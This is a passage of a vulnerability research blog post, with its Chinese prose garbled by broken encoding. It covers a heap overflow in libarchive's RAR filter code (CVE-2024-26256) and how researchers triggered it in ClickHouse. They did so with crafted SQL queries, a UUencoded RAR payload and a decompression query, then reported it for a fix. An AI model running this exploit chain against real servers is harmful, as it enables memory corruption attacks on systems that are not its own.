&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FilterType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// These values must not be changed, because we use them directly&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// in RAR5 compression and decompression code.&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;FILTER_DELTA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_E8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_E8E9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_ARM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
  &lt;span class=&quot;n&quot;&gt;FILTER_AUDIO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_RGB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_ITANIUM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_TEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
  
  &lt;span class=&quot;c1&quot;&gt;// These values can be changed.&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;FILTER_LONGRANGE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILTER_EXHAUSTIVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILTER_NONE&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;code-review&quot;&gt;Code Review&lt;/h4&gt;

&lt;p&gt;filter çš„è¡Œç‚ºçœ‹èµ·ä¾†å¾ˆæœ‰è¶£ï¼Œè€Œå¾®è»Ÿæ‰€ç™¼ç¾çš„æ¼æ´ä¹Ÿä½æ–¼ filter ä¹‹å…§ï¼Œæ‰€ä»¥æˆ‘å€‘å˜—è©¦å° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_rar.c&lt;/code&gt; é€²è¡Œ code reveiwã€‚&lt;/p&gt;

&lt;p&gt;ç¶“éä¸€æ®µæ™‚é–“æˆ‘å€‘ä¹Ÿåœ¨&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window&lt;/code&gt; æ‰¾åˆ°äº†ä¸€å€‹ heap buffer overflow çš„æ¼æ´ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window&lt;/code&gt; çš„åƒæ•¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; æ²’æœ‰ä»»ä½•æª¢æŸ¥å°±ç›´æ¥ä½¿ç”¨æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt;ï¼Œè€Œ buffer çš„å¤§å°åƒ…ç‚º 0x40004 bytesï¼š
&lt;img src=&quot;/assets/img/blog/20250212/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¾å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window&lt;/code&gt; çš„åœ°æ–¹ä¾†çœ‹ï¼Œå¯ä»¥ç™¼ç¾é€™æ˜¯ç”¨ä¾†å°‡è³‡æ–™è¤‡è£½é€² VM è¨˜æ†¶é«”çš„å‡½å¼ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ¼æ´æˆå› çœ‹èµ·ä¾†éå¸¸ç°¡å–®ï¼Œä½†è¼ƒéº»ç…©çš„æ˜¯éœ€è¦æ§‹é€  libarchive é¡˜æ„åŸ·è¡Œçš„ filterï¼Œä¸¦æä¾›æ­£ç¢ºé•·åº¦çš„è³‡æ–™ã€‚é€™äº›è³‡è¨Šä¸¦ä¸ç›´æ¥å­˜åœ¨æ–¼ RAR ä¸­æœ€è¡¨å±¤çš„æ¬„ä½ï¼Œè€Œæ˜¯å­˜åœ¨æ–¼ data ä¹‹ä¸­ã€‚ä¸¦ä¸”ï¼Œdata ç¶“é Huffman coding ç·¨ç¢¼ï¼Œå› æ­¤å¾Œé¢æ‰€æä¾›çš„è³‡è¨Šä¹Ÿå¿…é ˆå…ˆé€²è¡Œä¸€æ¬¡ç·¨ç¢¼ï¼Œè€Œä¸”ä¸æ˜¯ byte by byte è€Œæ˜¯ 7-bit by 7-bitã€‚ç”±æ–¼é€™éƒ¨åˆ†ä¸æ˜¯æœ¬æ–‡çš„é‡é»ï¼Œæˆ‘å€‘ä¸åœ¨é€™è£¡å±•é–‹ä¾†è¬›ï¼Œæˆ‘å€‘é¼“å‹µè®€è€…é€²è¡Œå¾©ç¾ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™å€‹æ¼æ´å·²ç¶“è¢«å¾®è»Ÿä¿®å¾©ï¼š&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26256&quot;&gt;CVE-2024-26256&lt;/a&gt;ã€‚è€Œé€™å€‹æ¼æ´æ²’æœ‰è¢« Fuzzer ç™¼ç¾çš„åŸå› ä¹Ÿå¾ˆç°¡å–®ï¼Œé›–ç„¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter-&amp;gt;blocklength&lt;/code&gt; åªè¦å¤ å¤§å°±èƒ½å¤ è§¸ç™¼è¶Šç•Œå¯«ï¼Œä½†éœ€è¦æä¾›èˆ‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter-&amp;gt;blocklength&lt;/code&gt; ä¸€æ¨£é•·çš„ data æ‰èƒ½é€šéæª¢æŸ¥ï¼Œè€Œåœ¨ coverage ç›¸åŒçš„æƒ…æ³ä¸‹ï¼ŒFuzzer é€šå¸¸å‚¾å‘æ–¼å°‡æª”æ¡ˆç¸®å°ã€‚&lt;/p&gt;

&lt;h3 id=&quot;half-dayé•·å¾—åƒ-0-day-çš„-1-day&quot;&gt;Half-dayï¼šé•·å¾—åƒ 0-day çš„ 1-day&lt;/h3&gt;

&lt;p&gt;ç•¶æˆ‘å€‘ç¨æ—©æåˆ°ã€Œå¾®è»Ÿç ”ç©¶åœ˜éšŠ Microsoft Offensive Research Security Engineering (MORSE) team å›å ±çš„å…©å€‹æ¼æ´ã€æ™‚ã€‚æˆ‘å€‘æåˆ°åœ¨æ§‹é€  PoC ä¸Šè¼ƒå›°é›£ï¼Œæˆ–è¨±æœ‰äººé¦¬ä¸Šå°±æƒ³åˆ°äº†ï¼šã€Œç‚ºä»€éº¼ä¸å» libarchive çš„ GitHub repository æ‰¾ test æˆ–æ˜¯èªªæ˜å‘¢ï¼Ÿã€å°ï¼Œæˆ‘å€‘æ‰¾éäº†ï¼Œæ²’æœ‰ã€‚&lt;/p&gt;

&lt;p&gt;å› ç‚ºç•¶æ™‚çš„ libarchive ç”šè‡³é‚„æ²’æœ‰è¢« patchï¼Œæˆ–æ˜¯èªªï¼Œå¯èƒ½ç”šè‡³æ²’æœ‰äººçŸ¥é“æ¼æ´å·²ç¶“å­˜åœ¨ï¼å¾®è»Ÿåœ¨ä¸€æœˆæ™‚ï¼Œå°±å·²ç¶“ä¿®å¾© Windows fork å‡ºå»çš„ libarchiveï¼š
&lt;img src=&quot;/assets/img/blog/20250212/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ç ”ç©¶çµæŸä¹‹å¾Œï¼Œæˆ‘å€‘æ‰åœ¨ libarchive çš„ GitHub repository ä¸Šçœ‹åˆ°å°æ‡‰çš„å…©å€‹ patch ï¼Œåˆ†åˆ¥æ˜¯äº”æœˆè·Ÿå››æœˆæ‰è¢« merge é€²å»ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é‚£è±ˆä¸æ˜¯åªè¦é•·æœŸæœ‰é—œæ³¨ Windows patch çš„äººé¦¬ä¸Šå°±æœƒç™¼ç¾ libarchive upstream å­˜åœ¨å…©å€‹å°šæœªä¿®è£œçš„æ¼æ´å—ï¼Ÿå®ƒå€‘å°æ–¼ Windows forked ç‰ˆæœ¬çš„ libarchive ä¾†èªªæ˜¯ 1-dayï¼Œå› ç‚ºæ¼æ´å·²è¢«ç™¼ç¾ä¸¦ä¸”ä¿®è£œäº†ï¼›å° libarchive upstream ä¾†èªªæ˜¯ 0-dayï¼Œå› ç‚ºå°šæœªæœ‰ä¿®è£œå­˜åœ¨ä¸”ç¶­è­·è€…ç”šè‡³å¯èƒ½ä¸çŸ¥æƒ…ï¼æˆ‘å€‘æ¥ä¸‹ä¾†æœƒå°‡é€™ç¨®æƒ…æ³ç¨±ç‚ºã€Œ0.5-dayã€æˆ–æ˜¯ã€ŒHalf-dayã€ã€‚&lt;/p&gt;

&lt;p&gt;æ–¼æ˜¯æˆ‘å€‘é–‹å§‹å°‹æ‰¾æœ‰ä½¿ç”¨ libarchive çš„å¤§å‹å°ˆæ¡ˆï¼Œæˆ‘å€‘æƒ³å˜—è©¦æ¨¡æ“¬é€™å€‹ã€Œåˆ©ç”¨ Half-day æ”»æ“Šã€çš„å ´æ™¯ï¼ŒåŒæ™‚ä¹Ÿèªç‚ºï¼Œåœ¨è»Ÿé«”ä¸­æ¡ç”¨ libarchive çš„å» å•†æœƒæ›´é¡˜æ„å¹«æˆ‘å€‘æ•¦ä¿ƒ libarchive ä¿®è£œæ¼æ´ã€‚&lt;/p&gt;

&lt;h3 id=&quot;attacking-clickhouse&quot;&gt;Attacking ClickHouse&lt;/h3&gt;

&lt;p&gt;ç¶“éä¸€ç•ªèª¿æŸ¥å¾Œï¼Œæˆ‘å€‘ç™¼ç¾ ClickHouse æœ‰ä½¿ç”¨ libarchive é€²è¡Œè§£å£“ç¸®ï¼Œéå¸¸æœ‰å¯èƒ½åŒ…å«äº†å­˜åœ¨æ¼æ´çš„ç¨‹å¼ç¢¼ã€‚åœ¨ ClickHouse ä¸­æˆ‘å€‘å¯ä»¥é€é file table engine å°å£“ç¸®æª”å…§çš„è³‡æ–™é€²è¡Œæ“ä½œï¼š
&lt;img src=&quot;/assets/img/blog/20250212/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¸éæ‰‹å†Šä¹Ÿæåˆ°ï¼ŒClickHouse åƒ…æ”¯æ´ zipã€tarã€7z ä¸‰ç¨®æ ¼å¼çš„å£“ç¸®æª”æ¡ˆï¼š
&lt;img src=&quot;/assets/img/blog/20250212/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†çœŸçš„æ˜¯é€™æ¨£å—ï¼Ÿé™¤äº† zip ä¹‹å¤–ï¼Œtar èˆ‡ 7z åœ¨ ClickHouse ä¸­ç”± &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TarArchiveReader&lt;/code&gt; èˆ‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SevenZipArchiveReader&lt;/code&gt; å¯¦ä½œï¼Œå…©è€…çš†ç¹¼æ‰¿æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LibArchiveReader&lt;/code&gt;ã€‚&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LibArchiveReader&lt;/code&gt; é–‹å•Ÿæª”æ¡ˆçš„è¡Œç‚ºå¯¦ä½œæ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open&lt;/code&gt; å‡½å¼ï¼Œåœ¨ &lt;a href=&quot;https://github.com/ClickHouse/ClickHouse/blob/0bd3016a17dab23e64a7e550b2754ce7f7aa1d82/src/IO/Archives/LibArchiveReader.cpp#L150&quot;&gt;source code&lt;/a&gt; ä¸­å¯çœ‹åˆ°ç†Ÿæ‚‰çš„ patternï¼š&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;archive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path_to_archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;archive_read_new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;archive_read_support_filter_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;archive_read_support_format_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ²’éŒ¯ï¼ŒClickHouse ä¹Ÿæ˜¯ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_all&lt;/code&gt; èˆ‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_filter_all&lt;/code&gt;ï¼Œè¡¨ç¤ºæˆ‘å€‘ä¸€æ¨£å¯ä»¥è§¸ç™¼å­˜åœ¨æ–¼ RAR ä¸­çš„å¼±é»ï¼æ¥ä¸‹ä¾†åªè¦è®“ ClickHouse ç‚ºæˆ‘å€‘è§£å£“ç¸®æª”æ¡ˆå³å¯ï¼Œé›–ç„¶ç¾åœ¨è§£å£“ç¸®çš„ feature å¯ä»¥ç›´æ¥å­˜å– s3 ä¸Šçš„æª”æ¡ˆï¼Œä½†&lt;strong&gt;ç•¶æ™‚ä¸¦ä¸èƒ½é€™æ¨£ä½¿ç”¨&lt;/strong&gt;ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥æˆ‘å€‘å¿…é ˆå…ˆä¸Šå‚³æª”æ¡ˆï¼Œå¯ä»¥é€éä¸‹åˆ— query æ–°å¢ä¸€å€‹ tableï¼Œä¸¦ä¸”è©² table æœƒä»¥æª”æ¡ˆçš„å½¢å¼è¢«å„²å­˜ï¼š&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;poc.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Native&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;payload&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä½†é€™æ¨£ç”¢ç”Ÿçš„ file æœƒåŒ…å« table çš„ metadataï¼Œåœ¨æœ‰ metadata çš„æƒ…æ³ä¸‹æˆ‘å€‘æ²’æœ‰è¾¦æ³•ä½¿ libarchive èªç‚ºé€™æ˜¯ä¸€å€‹ RAR æª”æ¡ˆï¼Œé€²è€Œè§¸ç™¼æ¼æ´ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000: 0101 0763 6f6c 756d 6e31 0653 7472 696e  ...column1.Strin
00000010: 6707 7061 796c 6f61 64                   g.payload
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ‘å€‘éœ€è¦åœ¨ ClickHouse çš„ &lt;a href=&quot;https://clickhouse.com/docs/en/interfaces/formats&quot;&gt;Output Data Formats&lt;/a&gt; ä¸­å°‹æ‰¾å“ªäº›æ ¼å¼ä¸æœƒåœ¨æª”æ¡ˆçš„é–‹é ­å­˜æ”¾ç½® metadataã€‚æœ€å¾Œæˆ‘å€‘æ±ºå®šä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TabSeparatedRaw&lt;/code&gt;ï¼Œåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TabSeparatedRaw&lt;/code&gt; ä¸­ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;è³‡æ–™è¢«ä¸€åˆ—ä¸€åˆ—å„²å­˜&lt;/li&gt;
  &lt;li&gt;ä¸€åˆ—ä¸­çš„è³‡æ–™è¢« tab åˆ†éš”é–‹&lt;/li&gt;
  &lt;li&gt;è³‡æ–™å…§ä¸èƒ½æœ‰ tab æˆ–æ›è¡Œ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ä¾‹å¦‚ï¼Œå¦‚æœä½¿ç”¨ä¸‹åˆ—å…©å€‹ qeury:&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;test.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;TabSeparatedRaw&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;row1 string&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;test.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;TabSeparatedRaw&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;row2 string&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æœ€å¾Œç”¢å‡ºçš„æª”æ¡ˆå…§å®¹æœƒæ˜¯ï¼š&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;row1 string
row2 string
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å› æ­¤ï¼Œè‹¥å¯ä»¥è™•ç†å¥½ç¬¬ä¸‰é»ã€Œè³‡æ–™å…§ä¸èƒ½æœ‰ tab æˆ–æ›è¡Œã€ï¼Œé‚£æˆ‘å€‘å°±å¯ä»¥æ§‹é€ å‡ºä¸€å€‹åˆæ³•çš„ RAR æª”æ¡ˆï¼é‚£è©²æ€éº¼æ¨£é¿å…ä½¿ç”¨ tab æˆ–æ›è¡Œå‘¢ï¼Ÿè½èµ·ä¾†å¾ˆé›£ï¼Œä½†ä¸è¦å¿˜äº†ï¼ŒClickHouse å‘¼å«äº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_filter_all&lt;/code&gt; ç‚ºæˆ‘å€‘é–‹å•Ÿäº†æ‰€æœ‰çš„ filterï¼å…¶ä¸­ï¼Œæœ€ç¬¦åˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TabSeperatedRaw&lt;/code&gt; æè¿°çš„å°±æ˜¯ UUencodeï¼Œç¶“é UUencode çš„è³‡æ–™æœƒé•·é€™æ¨£ï¼š&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;begin 600 exploit.rar.uu
M4F%R(1H&apos;`,^0&amp;lt;P``#0````````!287(A&amp;amp;@&amp;lt;`SY!S```-`````````%VI=(&quot;0
M,0&quot;VXP0`4,\+``(2&apos;^X4O1EY5QTU#``@````;7-V8W(Q,#`N9&amp;amp;QL`/#&amp;lt;ZFP8
M(AE0S(EB&apos;!(&quot;,EM(4I0M-&quot;H*&quot;T6JBHJ!1$1T%IKHFBA0H*:(VV2VP)98R9+*
M&quot;*`T&apos;I;&amp;amp;]1&amp;gt;J]&amp;gt;HZ!&amp;gt;KU4=(ZQTC:4VHB@J4WH2D-%--VSX9S);9IOO.9HF2E
MH47O?/GG[Y^6LSGO/&amp;gt;&amp;gt;Z&amp;gt;&amp;gt;\]YJS!N3_(^_P3SS&quot;O\S`P+6&amp;lt;_V&apos;P(,#`P,#`B
M.EX#-(,!V$Z07A+LVZ?4@K:RB=`NN&amp;lt;+9(IB&amp;lt;?NX``Y[L`3`P,#``,`&apos;/YCL*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å› æ­¤æœ€å¾Œæˆ‘å€‘åªéœ€è¦å°‡åŸæœ¬çš„ rar payload é€²è¡Œ UUEncode ä¹‹å¾Œä¸Šå‚³ï¼š&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;poc.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;TabSeparatedRaw&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uu_encoded_rar_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¸¦ä¸”è§¸ç™¼è§£å£“ç¸®ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM file(&apos;poc.7z :: **&apos;, RawBLOB)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å°±å¯ä»¥æˆåŠŸè§¸ç™¼è¶Šç•Œå¯«æ¼æ´äº†ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘æœ€å¾Œé€é ClickHouse åœ¨ Bugcrowd ä¸Šçš„è³é‡‘è¨ˆåŠƒé€²è¡Œå›å ±ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ClickHouse å¾ˆå¿«çš„å°±é€²è¡Œäº†&lt;a href=&quot;https://github.com/ClickHouse/ClickHouse/commit/c8a3a0bb11ad1344fbb50b10f50f8eb2a962aa7f&quot;&gt;ä¿®å¾©&lt;/a&gt;ï¼Œä¸¦ä¸”é¡˜æ„å¹«æˆ‘å€‘æ•¦ä¿ƒ libarchive é€²è¡Œæ¼æ´çš„ä¿®è£œï¼é›–ç„¶ä¸ç¢ºå®šå¾®è»Ÿæ˜¯å¦æœ‰å‘ŠçŸ¥ libarchive çš„ç¶­è­·è€…å€‘ä»»ä½•é—œæ–¼ CVE-2024-20696 èˆ‡ CVE-2024-20697 çš„æ¼æ´è³‡è¨Šï¼ˆå› ç‚ºæ²’æœ‰ä»»ä½•å…¬é–‹è³‡æ–™ï¼Œlibarchive åœ¨ GitHub repository ä¸Šçš„ &lt;a href=&quot;https://github.com/libarchive/libarchive/security/advisories?state=draft&quot;&gt;Security Advisories&lt;/a&gt; ä¹Ÿæ²’æœ‰ä»»ä½•è³‡æ–™å¯ä»¥åƒè€ƒï¼ï¼‰ã€‚ä½†å¦‚åŒæˆ‘å€‘å…ˆå‰æåˆ°çš„ï¼Œé€™å…©å€‹åŸå…ˆç”±å¾®è»Ÿåœ¨ forked ç‰ˆæœ¬çš„ libarchive ä¸­ç™¼ç¾çš„æ¼æ´ï¼Œæœ€çµ‚ libarchive ä¹Ÿåˆ†åˆ¥åœ¨äº”æœˆè·Ÿå››æœˆç²å¾—ä¿®å¾©ï¼ŒçµæŸäº†ã€ŒHalf-dayã€çš„å°·å°¬ç‹€æ³ã€‚&lt;/p&gt;

&lt;h3 id=&quot;æŒçºŒè¿½è¹¤&quot;&gt;æŒçºŒè¿½è¹¤&lt;/h3&gt;

